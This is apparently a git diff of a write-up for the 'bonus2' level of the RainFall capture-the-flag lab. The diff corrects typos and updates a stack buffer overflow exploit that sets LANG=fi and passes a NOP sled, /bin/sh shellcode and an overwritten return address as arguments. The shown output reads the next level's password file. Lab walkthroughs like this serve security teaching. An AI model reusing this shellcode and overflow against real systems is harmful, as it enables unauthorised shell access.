@@ -1,7 +1,5 @@
 # Bonus 2
 
-
-
 ```sh
 (gdb) info func
 All defined functions:
@@ -175,6 +173,7 @@ End of assembler dump.
 (gdb)
 ```
 
+Ghidra :
 
 ```sh
 void greetuser(undefined param_1)
@@ -264,9 +263,6 @@ undefined4 main(int param_1,int param_2)
 }
 ```
 
-This binary is kind heavy.
-
-
 
 ```sh
 bonus2@RainFall:~$ ./bonus2 lol
@@ -286,14 +282,13 @@ Hello wtffffffffffffffffffffffffffffffff
 bonus2@RainFall:~$
 ```
 
-We dont quite know how is the second argument is used.
+We dont quite know how the second argument is used.
 
 The program seems to use the LANG environnement variable.
 
 The language variable might a global, since its not initialised, this value receive a value that depend of the value of LANG, that we can modifiy.
 
 Lets check what is it checking.
-
 
 
 ```sh
@@ -313,6 +308,8 @@ Hyvää päivää lolllllll
 bonus2@RainFall:~$
 ```
 
+It seems that its changing the language of the 'Hello', we cant mention that this message is longer, it might be a clue.
+
 
 Lets try to make it segfault.
 
@@ -328,7 +325,7 @@ Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 bonus2@RainFall:~$
 ```
 
-The result is interessting, its not segfaulting but it ends up printing our second argument, we know av[1] and av[2] are close to each other in the memory, so weoverflowed something, but not enough to make it segfault.
+The result is interessting, its not segfaulting but it ends up printing our second argument, we know av[1] and av[2] are close to each other in the memory, so we overflowed something, but not enough to make it segfault.
 
 
 Lets try to overflow the second argument.
@@ -382,18 +379,18 @@ Since we control the EIP we can insert a shellcode.
 
 We are going to insert our shellcode into av[1], and then give the address of av[1] to the EIP.
 
-For that im going to give a random return address, followe by a random place where my NOP's is stored in av[1].
+For that im going to give a random return address, followed by a random place where my NOP's is stored in av[1].
 
 We already did it a several times in this CTF so no need to show how we find those addresses.
 
 ```sh
-./bonus2 `python -c "print('\x90' * 45 + 
+LANG=fi ./bonus2 `python -c "print('\x90' * 45 + 
 '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + ' ' + '\x90' * 18 + '\x28\x85\x04\x08' + '\xd4\xf8\xff\xbf' )"`
 ```
 
 
 ```sh
-bonus2@RainFall:~$ ./bonus2 `python -c "print('\x90' * 45 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + ' ' + '\x90' * 18 + '\x28\x85\x04\x08' + '\xd4\xf8\xff\xbf' )"`
+bonus2@RainFall:~$ LANG=fi ./bonus2 `python -c "print('\x90' * 45 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + ' ' + '\x90' * 18 + '\x28\x85\x04\x08' + '\xd4\xf8\xff\xbf' )"`
 Hyvää päivää ����������������������������������������������������������(����
 $ cat /home/user/bonus3/.pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
